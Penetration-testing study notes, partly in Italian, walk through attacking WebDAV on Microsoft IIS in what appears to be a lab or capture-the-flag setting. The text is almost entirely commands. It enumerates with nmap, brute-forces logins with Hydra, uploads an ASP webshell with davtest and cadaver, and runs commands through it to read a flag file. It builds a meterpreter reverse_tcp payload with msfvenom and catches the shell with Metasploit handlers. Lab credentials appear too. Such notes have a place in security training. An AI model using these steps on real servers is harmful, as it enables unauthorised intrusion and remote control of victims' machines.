Implementazione su IIS Server per gestire da remoto i file presenti sull'IIS utilizzato come file server.
Tools utili for exploitation: davtest e cadaver.
- DavTest: Utility per autenticarsi e testare eventuali exploit su WebDAV server.
  Effettua una serie di Test, connessione alla directory "/webdav", Creation directory, Upload with PUT file, Checking file execution e il tipo di estensione richiesta e restituire un report con i path, le estensioni valide per poter caricare una webshell.
- Cadaver: Utility per effettuare concretamente il file upload, download, on-screen display, namespace operations on WebDAV server.


```
### WebDAV - Step Exploitation
- Check wheather webDAV has been configured to run on the IIS web server
- Bruteforce the credentials for login
- Upload a malicious .asp file that can execute arbitary commands or obtain a reverse shell on the target


# WebDAV Tools: Davtest, cadaver
- DavTest: Utility  per autenticarsi ed testare eventuali exploit su WebDAV server.
  Effettua una serie di Test, connessione alla directory "/webdav", Creation directory, Upload with PUT file, Checking file execution e il tipo di estensione richiesta.

- Cadaver: cadaver supports file upload, download, on-screen display, namespace operations on WebDAV server.


> nmap -sV -sC 10.3.26.115
> nmap -p80 --script http-enum -sV 10.3.26.115
> Browser http://10.3.26.115/webdav/ - Login check


# WebDAV - davtest find out which file can be submitted:
> davtest -url http://10.3.26.115/webdav
> davtest -auth bob:password_123321 -url http://10.3.26.115/webdav


# WebDAV - cadaver
Download/Upload/Read script for navigate in to /webDav/:
Dopo aver trovato la directory che permette di eseguire file, upload con la PUT, ed il tipo di estensione concessa, posso connettermi con cadaver e uploadare il file.

> cadaver http://10.3.26.115/webdav
> dav:/webdav/> put /usr/share/webshells/asp/webshell.asp - file upload using cadaver
> http://10.0.16.177/webdav/webshell.asp?cmd=whoami
> http://10.0.16.177/webdav/webshell.asp?cmd=dir+C%3A%5C
> http://10.0.16.177/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt


# WebDAV - Genero il Payload per ottenere una reverse shell Metasploit
Mfsvenom (generator payload) -p (payload) windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 –f asp > webshell.asp

# WebDav - Exploiting Accessing the backdoor: 
> http://10.3.26.115/webdav/webshell.asp
Now type your command on the box and run , find flag


### WebDAV  - Complete Exploitation with Metasploit 

> davtest -auth bob:password_123321 -url http://10.4.18.218/webdav
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.4 LPORT=1234 -f asp > shell.asp
> cadaver http://10.4.18.218/webdav
> put /root/shell.asp
> service postgresql start && msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 10.10.80.4
> set LPORT 1234
> run
    
Browser http://10.4.18.218/webdav/shell.asp  
Got meterpreter session 
> sysinfo,getuid



# WebDav - Metasploit with default payload
Uso webDAV per cercare i file permessi e il tipo di estensione concessa per la PUT per poter usare il relativo modulo MSF (.asp in questo caso)

use exploit/windows/iis/iis_webdav_upload_asp 
set RHOSTS 10.0.17.27 
set HttpUsername bob
set HttpPassword password_123321 
set PATH /webdav/metasploit%RAND%.asp
exploit




# WebDav - Hydra
> hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.26.115 http-get /webdav/




```